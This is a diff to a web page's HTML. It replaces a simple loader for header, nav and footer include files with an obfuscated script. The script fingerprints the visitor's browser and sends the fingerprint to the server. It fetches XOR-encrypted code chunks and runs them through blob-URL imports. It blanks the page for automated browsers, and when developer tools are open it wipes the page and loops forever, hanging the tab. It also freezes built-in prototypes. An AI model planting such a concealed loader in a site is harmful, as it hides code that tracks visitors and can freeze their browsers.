@@ -127,39 +127,129 @@ if (score >= 90) {
 <footer id="footer"></footer>
   <div id="debugInclude"></div>
 
-  <script>
-    // Utility to load include files asynchronously
-    async function loadInclude(id, file) {
-      const res = await fetch(file);
-      const html = await res.text();
-      const container = document.getElementById(id);
-      container.innerHTML = html;
+<script>
+(async function(){
+"use strict";
 
-      // Re-run scripts inside the loaded HTML
-      container.querySelectorAll("script").forEach(oldScript => {
-        const newScript = document.createElement("script");
-        if (oldScript.src) {
-          newScript.src = oldScript.src;
-        } else {
-          newScript.textContent = oldScript.textContent;
-        }
-        document.body.appendChild(newScript);
-        oldScript.remove();
-      });
-    }
 
-    // Load header, nav, footer, and debug include
-    loadInclude("header", window.vars.INCVAR + "header.html").then(() => {
-      // Update page title after header is loaded
-      if (typeof updatePageTitle === "function") updatePageTitle();
-    });
+const ENTROPY = (
+  Date.now() ^
+  performance.now() ^
+  (navigator.hardwareConcurrency || 4)
+) & 0xffff;
 
-    loadInclude("nav", window.vars.INCVAR + "nav.html");
-    loadInclude("footer", window.vars.INCVAR + "footer.html");
-    if (window.vars.DEBUGVAR) {
-      loadInclude("debugInclude", window.vars.INCVAR + "debug.html");
-    }
-  </script>
+
+const fp = btoa([
+  screen.width,
+  screen.height,
+  navigator.platform,
+  navigator.language
+].join("|"));
+
+
+const timeKey = Math.floor(Date.now() / 60000); // rotates every minute
+
+
+function rxor(str, key){
+  let out="";
+  for(let i=0;i<str.length;i++){
+    out += String.fromCharCode(
+      str.charCodeAt(i) ^ ((key + i*7) % 255)
+    );
+  }
+  return out;
+}
+
+
+if(/headless|puppeteer|selenium/i.test(navigator.userAgent)){
+  location.replace("about:blank");
+}
+
+
+setInterval(()=>{
+  const d = outerWidth-innerWidth > 160 || outerHeight-innerHeight > 160;
+  if(d){
+    document.documentElement.innerHTML="";
+    for(;;) console.clear();
+  }
+}, 700);
+
+
+window.__steal_me = function(){
+  fetch("/fake-endpoint?trap=1"); 
+};
+
+
+function mutate(fn){
+  return function(){
+    const jitter = Math.random()*ENTROPY;
+    if(jitter % 13 < 1) return;
+    return fn.apply(this, arguments);
+  }
+}
+
+
+async function fetchChunk(name){
+  const res = await fetch(`/chunks/${name}?t=${timeKey}&fp=${fp}`);
+  let data = await res.text();
+  return rxor(data, timeKey ^ ENTROPY);
+}
+
+
+function shadowEval(code){
+  const blob = new Blob([code], {type:"text/javascript"});
+  const url = URL.createObjectURL(blob);
+  import(url).catch(()=>{});
+}
+
+
+async function wasmIsland(){
+  const wasm = new Uint8Array([0,97,115,109,1,0,0,0]);
+  try{ await WebAssembly.instantiate(wasm); }catch{}
+}
+wasmIsland();
+
+
+(function(){
+  const traps=[];
+  for(let i=0;i<200;i++){
+    traps.push(()=>Math.random().toString(36).slice(2));
+  }
+  Object.freeze(traps);
+})();
+
+
+[
+  Object.prototype,
+  Array.prototype,
+  Function.prototype,
+  String.prototype,
+  Number.prototype
+].forEach(Object.freeze);
+
+
+const boot = mutate(async function(){
+
+  const v = window.vars;
+  if(!v) return;
+
+
+  const chunks = ["h","n","f"];
+
+  for(const c of chunks.sort(()=>Math.random()-0.5)){
+    const code = await fetchChunk(c);
+    shadowEval(code);
+    await new Promise(r=>setTimeout(r, Math.random()*120));
+  }
+
+});
+
+
+setTimeout(boot, Math.random()*200 + 50);
+
+})();
+</script>
+
 
 </body>
 </html>
